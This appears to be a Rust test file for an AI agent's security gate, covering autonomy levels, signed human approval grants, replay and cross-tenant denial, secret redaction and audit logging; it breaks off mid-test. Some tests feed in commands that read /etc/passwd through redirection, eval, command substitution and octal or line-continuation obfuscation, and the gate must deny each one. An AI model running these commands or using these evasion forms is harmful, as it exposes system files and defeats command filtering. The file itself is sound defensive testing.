use super::*;
use chrono::Utc;
use serde_json::json;

/// Install (once) an in-memory process-global witness keyring so the
/// production gate path (`WitnessKeyring::global()`) verifies against the
/// same key the test signs with — no `$HOME`, filesystem, or `unsafe` env
/// mutation. Returns that keyring.
fn global_keyring_guard() -> &'static crate::acl::approval_grant::WitnessKeyring {
    crate::acl::approval_grant::WitnessKeyring::global_for_tests()
}

fn default_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    }
}

fn readonly_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        ..SecurityPolicy::default()
    }
}

fn full_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        ..SecurityPolicy::default()
    }
}

// ── AutonomyLevel ────────────────────────────────────────

#[test]
fn autonomy_default_is_full() {
    assert_eq!(AutonomyLevel::default(), AutonomyLevel::Full);
}

#[test]
fn autonomy_serde_roundtrip() {
    let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
    assert_eq!(json, "\"full\"");
    let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
    assert_eq!(parsed, AutonomyLevel::ReadOnly);
    let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
    assert_eq!(parsed2, AutonomyLevel::Supervised);
    let alias: AutonomyLevel = serde_json::from_str("\"read_only\"").unwrap();
    assert_eq!(alias, AutonomyLevel::ReadOnly);
    assert_eq!(serde_json::to_string(&alias).unwrap(), "\"readonly\"");
}

#[test]
fn can_act_readonly_false() {
    assert!(!readonly_policy().can_act());
}

#[test]
fn can_act_supervised_true() {
    assert!(default_policy().can_act());
}

#[test]
fn can_act_full_true() {
    assert!(full_policy().can_act());
}

#[test]
fn enforce_tool_operation_read_allowed_in_readonly_mode() {
    let p = readonly_policy();
    assert!(p.enforce_tool_operation(ToolOperation::Read, "memory_recall").is_ok());
}

#[test]
fn enforce_tool_operation_act_blocked_in_readonly_mode() {
    let p = readonly_policy();
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("read-only mode"));
}

#[test]
fn enforce_tool_operation_redacts_secrets_in_readonly_error() {
    // BUG-D1-02: the read-only deny reason embeds the operation_name, which
    // can carry credentials. The returned Err must not leak the plaintext.
    let p = readonly_policy();
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store --password=topsecret")
        .unwrap_err();
    assert!(err.contains("read-only mode"));
    assert!(
        !err.contains("topsecret"),
        "secret must be redacted in policy error: {err}"
    );
    assert!(err.contains("[REDACTED]"));
}

#[test]
fn authorize_command_execution_redacts_secrets_in_disallowed_error() {
    // BUG-D1-02: a command rejected by the policy surfaces the raw command
    // in the returned Err (propagated via `?` to stderr). Redact the secrets.
    // Phase 1: the per-command allowlist is gone, so to exercise the
    // "not allowed by security policy" deny path we use read-only mode, which
    // rejects every command outright.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&p);
    let err = gate
        .authorize_command_execution("shell", "deploy --token=supersecret", None)
        .unwrap_err();
    assert!(err.contains("not allowed by security policy"));
    assert!(
        !err.contains("supersecret"),
        "secret must be redacted in policy error: {err}"
    );
    assert!(err.contains("[REDACTED]"));
}

#[test]
fn authorize_resource_operation_redacts_secrets_in_approval_error() {
    // BUG-D1-02: the approval-required deny reason embeds operation_name; it
    // can carry credentials, so the returned Err must be redacted.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&p);
    let err = gate
        .authorize_resource_operation(
            "subagents",
            "subagents:spawn token=leakedvalue",
            ResourceRiskLevel::Medium,
            None,
        )
        .unwrap_err();
    assert!(err.contains("runtime approval grant"));
    assert!(
        !err.contains("leakedvalue"),
        "secret must be redacted in policy error: {err}"
    );
    assert!(err.contains("[REDACTED]"));
}

/// Autonomy is the only gate on an Act operation. Nothing rations how many
/// of them may run per unit of time, so a policy that permits acting at all
/// permits acting repeatedly.
#[test]
fn enforce_tool_operation_act_is_not_rationed() {
    let p = default_policy();
    for _ in 0..64 {
        p.enforce_tool_operation(ToolOperation::Act, "memory_store")
            .expect("test: an Act operation must never be refused for volume");
    }
}

#[test]
fn side_effect_gate_requires_matching_approval_grant_for_medium_risk_command() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&p);

    let denied = gate.authorize_command_execution("shell", "touch file.txt", None);
    assert!(denied.unwrap_err().contains("runtime approval grant"));

    let wrong_tool = ApprovalGrant::for_tool("cron", "test", None);
    let denied = gate.authorize_command_execution("shell", "touch file.txt", Some(&wrong_tool));
    assert!(denied.unwrap_err().contains("runtime approval grant"));

    let broad_tool_grant = ApprovalGrant::for_tool("shell", "test", None);
    let denied = gate.authorize_command_execution("shell", "touch file.txt", Some(&broad_tool_grant));
    assert!(denied.unwrap_err().contains("runtime approval grant"));

    let grant = ApprovalGrant::for_command("shell", "touch file.txt", "test", None);
    assert_eq!(
        gate.authorize_command_execution("shell", "touch file.txt", Some(&grant))
            .unwrap(),
        CommandRiskLevel::Medium
    );
}

#[test]
fn approval_grant_command_hash_binds_to_command_content() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&p);
    let grant = ApprovalGrant::for_command("shell", "touch approved.txt", "test", None);

    assert!(
        gate.authorize_command_execution("shell", "touch other.txt", Some(&grant))
            .unwrap_err()
            .contains("runtime approval grant")
    );
    assert_eq!(
        gate.authorize_command_execution("shell", "touch approved.txt", Some(&grant))
            .unwrap(),
        CommandRiskLevel::Medium
    );
}

#[test]
fn side_effect_gate_resource_operation_obeys_readonly_and_medium_grants() {
    let readonly = readonly_policy();
    let readonly_gate = SideEffectGate::new(&readonly);
    let denied = readonly_gate
        .authorize_resource_operation(
            "sessions_send",
            "sessions_send:steer:run-1",
            ResourceRiskLevel::Low,
            None,
        )
        .unwrap_err();
    assert!(denied.contains("read-only mode"));

    let supervised = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let supervised_gate = SideEffectGate::new(&supervised);
    let denied = supervised_gate
        .authorize_resource_operation("subagents", "subagents:kill:run-1", ResourceRiskLevel::Medium, None)
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));

    let wrong_operation = ApprovalGrant::for_resource_operation("subagents", "subagents:kill:run-2", "test", None);
    let denied = supervised_gate
        .authorize_resource_operation(
            "subagents",
            "subagents:kill:run-1",
            ResourceRiskLevel::Medium,
            Some(&wrong_operation),
        )
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));

    let broad_tool_grant = ApprovalGrant::for_tool("subagents", "test", None);
    let denied = supervised_gate
        .authorize_resource_operation(
            "subagents",
            "subagents:kill:run-1",
            ResourceRiskLevel::Medium,
            Some(&broad_tool_grant),
        )
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));

    let grant = ApprovalGrant::for_resource_operation("subagents", "subagents:kill:run-1", "test", None);
    assert_eq!(
        supervised_gate
            .authorize_resource_operation(
                "subagents",
                "subagents:kill:run-1",
                ResourceRiskLevel::Medium,
                Some(&grant),
            )
            .unwrap(),
        ResourceRiskLevel::Medium
    );
}

// Phase 1: `block_high_risk_commands` was removed; `full` now authorizes every
// resource operation (including high-risk) unconditionally, so the former
// `side_effect_gate_blocks_high_risk_resource_when_policy_blocks_high` test no
// longer has a behavior to assert and was deleted.

#[test]
fn side_effect_gate_accepts_verified_v2_resource_grant_only() {
    use crate::acl::approval_grant::{ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring};

    // The gate re-verifies against the process-global keyring, so the grant
    // must be signed by that same key. Pin it to a temp file.
    let _guard = global_keyring_guard();
    let keyring = WitnessKeyring::global().unwrap();
    let grant = ApprovalGrantV2::issue_one_shot(
        keyring,
        Subject {
            agent_id: "prx:test:agent".to_string(),
            principal_id: "telegram:alice".to_string(),
            owner_id: "owner:alice".to_string(),
            workspace_id: "workspace".to_string(),
            session_key: Some("session-a".to_string()),
        },
        IssuerAuthority::HumanReview,
        "nodes:exec:n1",
        RiskLevel::High,
    )
    .unwrap();
    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&policy);

    // A tampered grant (signature won't verify against the keyring) is
    // rejected regardless of any wire flag.
    let mut tampered_inner = grant.clone();
    tampered_inner.capability.op_id = "nodes:exec:n2".to_string();
    let tampered = ApprovalGrant {
        tool: "nodes".to_string(),
        operation_hash: None,
        operation_hash_v2: None,
        actor: "test".to_string(),
        scope: Some(grant.grant_id.clone()),
        expires_at_epoch_secs: Some(grant.expires_at.timestamp()),
        v2: Some(tampered_inner),
        v2_verified: true, // even an attacker-set "verified" flag must not help
        caller_principal_id: Some("telegram:alice".to_string()),
    };
    let denied = gate
        .authorize_resource_operation("nodes", "nodes:exec:n1", ResourceRiskLevel::High, Some(&tampered))
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));

    // A properly signed grant, bound to the matching caller principal, is
    // honoured through the real gate verification path (calls
    // `verify_for_operation_bound` against the global keyring).
    let verified = ApprovalGrant::from_verified_v2("nodes", "test", grant)
        .with_caller_principal_id(Some("telegram:alice".to_string()));
    assert_eq!(
        gate.authorize_resource_operation("nodes", "nodes:exec:n1", ResourceRiskLevel::High, Some(&verified))
            .unwrap(),
        ResourceRiskLevel::High
    );
}

/// Issue a signed v2 grant exactly as the agent loop does, serialize it into
/// a tool-call args object (the trust boundary), then re-read it through
/// `from_runtime_args` and feed it to the gate — i.e. the full production
/// chain: loop-sign → JSON → tool deserialize → gate verify.
fn issue_v2_into_args(
    op_id: &str,
    risk: crate::acl::approval_grant::RiskLevel,
    scope_principal: &str,
) -> serde_json::Value {
    use crate::acl::approval_grant::{ApprovalGrantV2, IssuerAuthority, Subject, WitnessKeyring};

    let _guard = global_keyring_guard();
    let keyring = WitnessKeyring::global().unwrap();
    let grant = ApprovalGrantV2::issue_one_shot(
        keyring,
        Subject {
            agent_id: "prx:agent:telegram".to_string(),
            principal_id: "telegram:alice".to_string(),
            owner_id: "owner:ws:telegram:alice".to_string(),
            workspace_id: "ws".to_string(),
            session_key: Some("chat-1".to_string()),
        },
        IssuerAuthority::HumanReview,
        op_id,
        risk,
    )
    .unwrap();
    // The loop wraps with from_verified_v2 then serializes; `v2_verified` is
    // `#[serde(skip)]` so it never reaches the wire.
    let wrapped = ApprovalGrant::from_verified_v2("file_write", "approval_manager", grant);
    let grant_json = serde_json::to_value(&wrapped).unwrap();
    json!({
        RUNTIME_APPROVAL_GRANT_ARG: grant_json,
        "_zc_scope_trusted": true,
        "_zc_scope": { "principal_id": scope_principal },
    })
}

#[test]
fn v2_grant_end_to_end_through_runtime_args_reaches_gate() {
    let op = "file_write:write:abcd";
    let args = issue_v2_into_args(op, crate::acl::approval_grant::RiskLevel::Medium, "telegram:alice");

    // The deserialized grant must NOT carry a trusted `v2_verified` flag.
    let grant = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");
    assert!(!grant.v2_verified, "v2_verified must never survive deserialization");
    assert_eq!(grant.caller_principal_id.as_deref(), Some("telegram:alice"));
    assert!(grant.v2.is_some());

    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&policy);
    // Full chain authorizes: gate re-verifies signature + principal binding.
    assert_eq!(
        gate.authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .unwrap(),
        ResourceRiskLevel::Medium
    );
}

#[test]
fn try_consume_v2_grant_enforces_max_uses() {
    // Direct ledger test (no keyring/env needed): a unique grant_id with
    // max_uses=2 is consumable exactly twice, then denied (M5). max_uses=0 is
    // never consumable.
    let gid = format!("grant-test-{}", uuid::Uuid::now_v7());
    assert!(try_consume_v2_grant(&gid, 2), "1st consume must succeed");
    assert!(try_consume_v2_grant(&gid, 2), "2nd consume must succeed");
    assert!(!try_consume_v2_grant(&gid, 2), "3rd consume must be denied (exhausted)");

    let zero = format!("grant-test-zero-{}", uuid::Uuid::now_v7());
    assert!(!try_consume_v2_grant(&zero, 0), "max_uses=0 must never consume");
}

#[test]
fn gate_denies_single_use_v2_grant_on_replay() {
    // M5 replay defense end-to-end: a single-use (max_uses=1) v2 grant is
    // allowed exactly once through the gate; a second authorization of the
    // SAME grant within the validity window is denied (uses exhausted).
    let op = "file_write:write:single-use-replay";
    let args = issue_v2_into_args(op, crate::acl::approval_grant::RiskLevel::Medium, "telegram:alice");
    let grant = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");
    assert_eq!(
        grant.v2.as_ref().map(|g| g.max_uses),
        Some(1),
        "runtime grants are single-use by default"
    );

    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };

    let first = SideEffectGate::new(&policy).authorize_resource_operation(
        "file_write",
        op,
        ResourceRiskLevel::Medium,
        Some(&grant),
    );
    assert!(first.is_ok(), "first use of a single-use grant must be allowed");

    let second = SideEffectGate::new(&policy).authorize_resource_operation(
        "file_write",
        op,
        ResourceRiskLevel::Medium,
        Some(&grant),
    );
    assert!(
        second.is_err(),
        "second use of a single-use grant must be denied (replay)"
    );
}

#[test]
fn v2_glob_grant_matches_resolved_op_through_gate() {
    use crate::acl::approval_grant::{
        ApprovalGrantV2, IssuerAuthority, OpIdMatch, RiskLevel, Subject, WitnessKeyring,
    };

    let _guard = global_keyring_guard();
    let keyring = WitnessKeyring::global().unwrap();
    // Loop issues a tool+verb glob (file_write derives its real op-id from
    // the canonicalized resolved path, which the loop cannot reproduce).
    let grant = ApprovalGrantV2::issue_one_shot_match(
        keyring,
        Subject {
            agent_id: "prx:agent:telegram".to_string(),
            principal_id: "telegram:alice".to_string(),
            owner_id: "owner:ws:telegram:alice".to_string(),
            workspace_id: "ws".to_string(),
            session_key: Some("chat-1".to_string()),
        },
        IssuerAuthority::HumanReview,
        "file_write:write:*",
        OpIdMatch::GlobPattern("file_write:write:*".to_string()),
        RiskLevel::Medium,
    )
    .unwrap();
    let wrapped = ApprovalGrant::from_verified_v2("file_write", "approval_manager", grant);
    let args = json!({
        RUNTIME_APPROVAL_GRANT_ARG: serde_json::to_value(&wrapped).unwrap(),
        "_zc_scope_trusted": true,
        "_zc_scope": { "principal_id": "telegram:alice" },
    });
    let read = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");

    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&policy);
    // The tool's resolved op-id (e.g. file_write:write:<sha16>) must be
    // authorized by the glob.
    let resolved_op = "file_write:write:0123456789abcdef";
    assert_eq!(
        gate.authorize_resource_operation("file_write", resolved_op, ResourceRiskLevel::Medium, Some(&read))
            .unwrap(),
        ResourceRiskLevel::Medium
    );
    // But a different tool/verb op is NOT covered by the glob.
    let other = gate
        .authorize_resource_operation(
            "file_write",
            "file_write:delete:0123",
            ResourceRiskLevel::Medium,
            Some(&read),
        )
        .unwrap_err();
    assert!(other.contains("runtime approval grant"));
}

#[test]
fn v2_grant_cross_tenant_rejected_through_runtime_args() {
    let op = "file_write:write:abcd";
    // Grant subject is telegram:alice, but the trusted scope says the caller
    // is telegram:mallory — M4 cross-tenant reuse must be denied.
    let args = issue_v2_into_args(op, crate::acl::approval_grant::RiskLevel::Medium, "telegram:mallory");
    let grant = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");
    assert_eq!(grant.caller_principal_id.as_deref(), Some("telegram:mallory"));

    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&policy);
    let denied = gate
        .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));
}

#[test]
fn p3_07_for_command_binds_256bit_v2_digest() {
    // for_command now mints a 256-bit (SHA-256) v2 digest as well as the
    // legacy 64-bit one.
    let grant = ApprovalGrant::for_command("shell", "rm -rf /tmp/x", "policy", None);
    let v2 = grant.operation_hash_v2.as_deref().expect("v2 digest must be present");
    // SHA-256 hex is exactly 64 hex chars (256 bits).
    assert_eq!(v2.len(), 64, "expected 256-bit hex digest, got {v2}");
    assert!(v2.chars().all(|c| c.is_ascii_hexdigit()));
    // v2 digest equals the standalone helper for the same input...
    assert_eq!(v2, command_operation_hash_v2("shell", "rm -rf /tmp/x"));
    // ...and differs for a different command (second-preimage binding).
    assert_ne!(v2, command_operation_hash_v2("shell", "rm -rf /tmp/y"));
}

#[test]
fn p3_07_v2_digest_binds_command_and_rejects_mismatch() {
    let now = Utc::now().timestamp();
    let grant = ApprovalGrant::for_command("shell", "echo hi", "policy", None);
    // The v2-bound grant authorizes the exact command it was minted for.
    assert!(grant.permits_command("shell", "echo hi", CommandRiskLevel::Low, now));
    // A different command (which would collide only on a 64-bit truncation
    // attack) is rejected by the 256-bit binding.
    assert!(!grant.permits_command("shell", "echo bye", CommandRiskLevel::Low, now));
    // Wrong tool is rejected too.
    assert!(!grant.permits_command("other", "echo hi", CommandRiskLevel::Low, now));
}

#[test]
fn p3_07_v1_only_grant_still_verifies_via_fallback() {
    // Simulate a legacy grant persisted before v2 existed: it carries only
    // the 64-bit digest. Verification must fall back to v1 and still bind.
    let now = Utc::now().timestamp();
    let mut legacy = ApprovalGrant::for_command("shell", "ls -la", "policy", None);
    legacy.operation_hash_v2 = None; // pre-v2 on-disk shape
    assert!(legacy.operation_hash.is_some(), "v1 digest preserved");
    assert!(legacy.permits_command("shell", "ls -la", CommandRiskLevel::Low, now));
    assert!(!legacy.permits_command("shell", "ls -l", CommandRiskLevel::Low, now));
}

#[test]
fn p3_07_v1_grant_json_without_v2_field_deserializes() {
    // d08 backward compatibility: a serialized v1 grant that predates the
    // operation_hash_v2 field must still deserialize (serde default = None).
    let json = r#"{
            "tool": "shell",
            "operation_hash": 305419896,
            "actor": "policy",
            "scope": null,
            "expires_at_epoch_secs": null
        }"#;
    let grant: ApprovalGrant = serde_json::from_str(json).expect("v1 grant deserializes");
    assert_eq!(grant.operation_hash, Some(305_419_896));
    assert_eq!(grant.operation_hash_v2, None);
    // A v1-only grant also serializes without emitting the v2 field.
    let out = serde_json::to_string(&grant).expect("serialize");
    assert!(
        !out.contains("operation_hash_v2"),
        "v1 grant must not emit v2 field: {out}"
    );
}

#[test]
fn p3_10_gate_denies_when_reentrancy_depth_exceeded() {
    // Full autonomy so a benign command is otherwise authorized; the only
    // reason to deny here must be the re-entrancy depth bound.
    let mut autonomy = crate::config::AutonomyConfig::default();
    autonomy.level = AutonomyLevel::Full;
    let policy = SecurityPolicy::from_config(&autonomy, std::path::Path::new("/tmp"));

    // `cargo test` reuses worker threads, and GATE_DEPTH is thread-local, so
    // a previously-aborted test could have left a non-zero residual depth on
    // this thread. Snapshot it and restore deterministically at the end so
    // this test neither sees stale state nor leaks state into sibling tests.
    let baseline = GateDepthGuard::current_depth();

    // Hold MAX_GATE_DEPTH active depth guards on top of the baseline; the
    // next gate call enters one level deeper and must be denied. The guards
    // are dropped explicitly below (and on panic via RAII) so depth returns
    // to `baseline`.
    let mut guards = Vec::new();
    for _ in 0..=(MAX_GATE_DEPTH - baseline.min(MAX_GATE_DEPTH)) {
        guards.push(GateDepthGuard::enter());
    }
    let denied = SideEffectGate::new(&policy)
        .authorize_command_execution("shell", "ls", None)
        .unwrap_err();
    assert!(denied.contains("re-entrancy depth"), "{denied}");
    drop(guards);

    // Back at `baseline` depth: a fresh authorization is accepted again,
    // proving the guard restores state (the gate enters exactly one level).
    assert_eq!(GateDepthGuard::current_depth(), baseline);
    assert!(
        SideEffectGate::new(&policy)
            .authorize_command_execution("shell", "ls", None)
            .is_ok()
    );
    assert_eq!(
        GateDepthGuard::current_depth(),
        baseline,
        "gate authorization must not leak depth"
    );
}

#[test]
fn gate_denies_op_with_no_precise_binding() {
    // operation_hash = None AND v2 = None => deny (d08 tightened default).
    let wildcard = ApprovalGrant::for_tool("file_write", "approval_manager", None);
    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&policy);
    let denied = gate
        .authorize_resource_operation(
            "file_write",
            "file_write:write:abcd",
            ResourceRiskLevel::Medium,
            Some(&wildcard),
        )
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));
}

#[test]
fn v2_grant_expired_and_revoked_rejected_through_gate() {
    use crate::acl::approval_grant::{
        ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring, sign_grant,
    };

    let _guard = global_keyring_guard();
    let keyring = WitnessKeyring::global().unwrap();
    let subject = Subject {
        agent_id: "prx:agent:telegram".to_string(),
        principal_id: "telegram:alice".to_string(),
        owner_id: "owner:ws:telegram:alice".to_string(),
        workspace_id: "ws".to_string(),
        session_key: Some("chat-1".to_string()),
    };
    let op = "file_write:write:expired";

    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    let gate = SideEffectGate::new(&policy);

    // Expired: backdate the window and re-sign so the signature is valid but
    // the temporal check fails.
    let mut expired = ApprovalGrantV2::issue_one_shot(
        keyring,
        subject.clone(),
        IssuerAuthority::HumanReview,
        op,
        RiskLevel::Medium,
    )
    .unwrap();
    expired.not_before = Utc::now() - chrono::Duration::seconds(120);
    expired.expires_at = Utc::now() - chrono::Duration::seconds(60);
    sign_grant(keyring, &mut expired).unwrap();
    let expired_grant = ApprovalGrant::from_verified_v2("file_write", "test", expired)
        .with_caller_principal_id(Some("telegram:alice".to_string()));
    let denied = gate
        .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&expired_grant))
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));

    // Revoked: valid window and signature, but revoked_at is set.
    let mut revoked =
        ApprovalGrantV2::issue_one_shot(keyring, subject, IssuerAuthority::HumanReview, op, RiskLevel::Medium)
            .unwrap();
    revoked.revoke("operator", Utc::now());
    sign_grant(keyring, &mut revoked).unwrap();
    let revoked_grant = ApprovalGrant::from_verified_v2("file_write", "test", revoked)
        .with_caller_principal_id(Some("telegram:alice".to_string()));
    let denied = gate
        .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&revoked_grant))
        .unwrap_err();
    assert!(denied.contains("runtime approval grant"));
}

// ── Audit compliance (EU AI Act Art.12) ──────────────────

/// Supervised policy rooted at a real temp workspace so the best-effort
/// audit hook actually writes `audit.log` (it skips `.`/empty workspaces).
fn audited_policy() -> (tempfile::TempDir, SecurityPolicy) {
    let tmp = tempfile::TempDir::new().expect("test: temp workspace");
    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        workspace_dir: tmp.path().to_path_buf(),
        ..SecurityPolicy::default()
    };
    (tmp, policy)
}

fn read_audit_events(workspace: &std::path::Path) -> Vec<crate::security::audit::AuditEvent> {
    let raw = std::fs::read_to_string(workspace.join("audit.log")).expect("test: read audit.log");
    raw.lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| serde_json::from_str(l).expect("test: parse audit event"))
        .collect()
}

fn last_deny_reason(workspace: &std::path::Path) -> String {
    read_audit_events(workspace)
        .last()
        .and_then(|e| e.result.as_ref())
        .and_then(|r| r.error.clone())
        .expect("test: deny reason recorded")
}

#[test]
fn gate_with_audit_enabled_writes_audit_log() {
    let tmp = tempfile::TempDir::new().expect("test: temp workspace");
    let policy = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        workspace_dir: tmp.path().to_path_buf(),
        ..SecurityPolicy::default()
    }
    .with_audit_config(crate::config::AuditConfig::default());

    let gate = SideEffectGate::new(&policy);
    let _ = gate.authorize_resource_operation("file_write", "file_write:write:x", ResourceRiskLevel::Medium, None);

    assert!(
        tmp.path().join("audit.log").exists(),
        "audit.log must be created when security.audit.enabled=true"
    );
}

#[test]
fn forbidden_redirection_gate_records_one_deny_for_each_shell_entry_name_and_bypass() {
    let (tmp, policy) = audited_policy();
    let gate = SideEffectGate::new(&policy);
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        for command in ["cat </etc/passwd", "cat</etc/passwd"] {
            let reason = gate
                .authorize_command_execution(tool_name, command, None)
                .expect_err("forbidden redirection path should be denied");
            assert_eq!(reason, "forbidden path argument: /etc/passwd");
        }
    }

    let events = read_audit_events(tmp.path());
    assert_eq!(events.len(), 6, "each gate call must emit exactly one audit event");
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        let prefix = format!("{tool_name}:");
        let matching = events
            .iter()
            .filter(|event| {
                event
                    .action
                    .as_ref()
                    .and_then(|action| action.command.as_deref())
                    .is_some_and(|command| command.starts_with(&prefix))
            })
            .count();
        assert_eq!(matching, 2, "expected one audit decision per bypass for {tool_name}");
    }
}

#[test]
fn dynamic_path_gate_records_one_deny_for_each_shell_entry_name() {
    let (tmp, policy) = audited_policy();
    let gate = SideEffectGate::new(&policy);
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        let reason = gate
            .authorize_command_execution(tool_name, "FILE=/etc/passwd; eval 'cat $FILE'", None)
            .expect_err("wrapper-hidden dynamic shell path should fail closed");
        assert_eq!(reason, "forbidden dynamic path argument: $FILE");
    }

    let events = read_audit_events(tmp.path());
    assert_eq!(events.len(), 3, "each gate call must emit exactly one audit event");
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        let prefix = format!("{tool_name}:");
        let matching = events
            .iter()
            .filter(|event| {
                event
                    .action
                    .as_ref()
                    .and_then(|action| action.command.as_deref())
                    .is_some_and(|command| command.starts_with(&prefix))
            })
            .count();
        assert_eq!(matching, 1, "expected one dynamic-path audit decision for {tool_name}");
    }
}

#[test]
fn active_substitution_gate_records_one_deny_per_tool_and_form() {
    let (tmp, policy) = audited_policy();
    let gate = SideEffectGate::new(&policy);
    let commands = [
        r#"cat `printf '\057etc\057passwd'`"#,
        r#"echo "$(cat /etc/passwd)""#,
        "cat <(printf secret)",
    ];
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        for command in commands {
            let reason = gate
                .authorize_command_execution(tool_name, command, None)
                .expect_err("active substitution must fail closed");
            assert_eq!(reason, "forbidden active shell substitution");
        }
    }

    let events = read_audit_events(tmp.path());
    assert_eq!(events.len(), 9, "each gate call must emit exactly one audit event");
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        let prefix = format!("{tool_name}:");
        let matching = events
            .iter()
            .filter(|event| {
                event
                    .action
                    .as_ref()
                    .and_then(|action| action.command.as_deref())
                    .is_some_and(|command| command.starts_with(&prefix))
            })
            .count();
        assert_eq!(matching, 3, "expected one audit decision per substitution form");
    }
}

#[test]
fn line_continuation_substitution_gate_records_original_command_once_per_tool_and_form() {
    let (tmp, policy) = audited_policy();
    let gate = SideEffectGate::new(&policy);
    let commands = [
        "echo $\\\n(printf secret)",
        "cat <\\\n(printf secret)",
        "echo $\\\r\n(printf secret)",
        "cat <\\\r\n(printf secret)",
    ];
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        for command in commands {
            let reason = gate
                .authorize_command_execution(tool_name, command, None)
                .expect_err("line continuation must not split an active substitution operator");
            assert_eq!(reason, "forbidden active shell substitution");
        }
    }

    let events = read_audit_events(tmp.path());
    assert_eq!(events.len(), 12, "each gate call must emit exactly one audit event");
    for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
        for command in commands {
            let expected = format!("{tool_name}:{command}");
            let matching = events
                .iter()
                .filter(|event| {
                    event.action.as_ref().and_then(|action| action.command.as_deref()) == Some(expected.as_str())
                })
                .count();
            assert_eq!(matching, 1, "audit must retain the original physical command exactly");
        }
    }
}

#[test]
fn gate_allow_writes_audit_event_with_compliance_fields() {
    use crate::acl::approval_grant::{ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring};
    let _guard = global_keyring_guard();
    let keyring = WitnessKeyring::global().expect("test: keyring");
    let op = "file_write:write:allowme";
    let grant_v2 = ApprovalGrantV2::issue_one_shot(
        keyring,
        Subject {
            agent_id: "prx:agent".to_string(),
            principal_id: "telegram:alice".to_string(),
            owner_id: "owner:alice".to_string(),
            workspace_id: "ws".to_string(),
            session_key: Some("s1".to_string()),
        },
        IssuerAuthority::HumanReview,
        op,
        RiskLevel::Medium,
    )
    .expect("test: issue grant");
    let grant_id = grant_v2.grant_id.clone();
    let grant = ApprovalGrant::from_verified_v2("file_write", "test", grant_v2)
        .with_caller_principal_id(Some("telegram:alice".to_string()));

    let (tmp, policy) = audited_policy();
    let gate = SideEffectGate::new(&policy);
    assert_eq!(
        gate.authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .expect("test: allow"),
        ResourceRiskLevel::Medium
    );

    let events = read_audit_events(tmp.path());
    let event = events.last().expect("an audit event was written");
    let actor = event.actor.as_ref().expect("actor present");
    assert_eq!(
        actor.user_id.as_deref(),
        Some("telegram:alice"),
        "subject principal recorded"
    );
    let action = event.action.as_ref().expect("action present");
    assert!(action.allowed, "decision is allow");
    let command = action.command.as_deref().expect("op recorded");
    assert!(command.contains(op), "op_id recorded");
    assert!(command.contains(&format!("grant_id={grant_id}")), "grant_id recorded");
    assert!(event.timestamp <= Utc::now(), "timestamp stamped");
}

#[test]
fn gate_deny_writes_audit_event_with_precise_reason() {
    use crate::acl::approval_grant::{
